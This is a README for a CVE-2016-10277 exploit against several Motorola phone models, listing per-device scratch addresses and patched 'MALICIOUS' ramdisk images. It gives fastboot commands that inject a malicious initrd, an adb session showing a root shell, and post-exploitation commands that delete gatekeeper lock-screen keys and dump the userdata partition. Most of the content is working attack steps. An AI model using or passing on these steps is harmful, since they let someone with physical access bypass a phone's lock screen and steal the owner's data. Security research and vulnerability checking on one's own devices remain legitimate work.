# Exploiting CVE-2016-10277
More information at: https://alephsecurity.com/2017/06/07/initroot-moto/

If you just want to check if your device is vulnerable, 
it might be quicker if you just flash stock ramdisk (without any modifications). 
If it's your case, just look for ``initroot-*-STOCK*.cpio.gz``.

## Motorola XT-1033
- Scratch Address: 0x11000000
- Padding: 64MB
- Stockrom padded ramdisk: initroot-xt1033-p64-STOCK.cpio.gz
- Stockrom patched and padded ramdisk: initroot-xt1033-p64-MALICIOUS.cpio.gz

## Motorola XT-1040
- Scratch Address: 0x11000000
- Padding: 64MB
- Stockrom padded ramdisk: initroot-xt1040-p64-STOCK.cpio.gz
- Stockrom patched and padded ramdisk: initroot-xt1040-p64-MALICIOUS.cpio.gz

## Motorola XT-1068
- Scratch Address: 0x11000000
- Padding: 64MB
- Stockrom padded ramdisk: initroot-xt1068-p64-STOCK.cpio.gz
- Stockrom patched and padded ramdisk: initroot-xt1068-p64-MALICIOUS.cpio.gz

## Motorola XT-1069
- Scratch Address: 0x11000000
- Padding: 64MB
- Stockrom padded ramdisk: initroot-xt1069-p64-STOCK.cpio.gz
- Stockrom patched and padded ramdisk: initroot-xt1069-p64-MALICIOUS.cpio.gz

## Motorola XT-1078
- Scratch Address: 0x11000000
- Padding: 64MB
- Stockrom padded ramdisk: initroot-xt1078-p64-STOCK.cpio.gz
- Stockrom patched and padded ramdisk: initroot-xt1078-p64-MALICIOUS.cpio.gz

## Motorola XT-1514
- Scratch Address: 0x90000000
- Padding: 64MB
- Stockrom padded ramdisk: initroot-xt1514-p64-STOCK.cpio.gz
- Stockrom patched and padded ramdisk: initroot-xt1514-p64-MALICIOUS.cpio.gz



## Running and cheking root access: 
  - Flashing and solving bootloops: 
  
        git clone https://github.com/leosol/initroot.git
        cd xt1040 (or any other folder)
        use ./run-malicious.sh, run-stockramfs.sh and solve-bootloop.sh (if you have any bootloop)
        Or use the following commands:
		fastboot flash aleph $FILE_NAME
		fastboot oem config fsg-id "a initrd=SCRATCH+PAD,LENGTH"
		fastboot continue
		#use the following to solve bootloops
		fastboot oem config fsg-id ""

  - Checking root privileges:   
  
        root@debian-vaio:~/motoramfs/xt1040# adb devices
        List of devices attached
        * daemon not running. starting it now on port 5037 *
        * daemon started successfully *
        T0092020C5	device

        root@debian-vaio:~/motoramfs/xt1040# adb shell
        root@peregrine:/ # getenforce
        >Permissive

  - What can I do with root?   

        #remove authentication as pointed out by @kraftdenker (tested on xt1068)
        mv /data/system/gatekeeper.password.key /data/system/_gatekeeper.password.key
        mv /data/system/gatekeeper.pattern.key /data/system/_gatekeeper.pattern.key

        #dump your data
        adb pull /dev/block/platform/msm_sdcc.1/by-name/userdata

        #or make it permanent


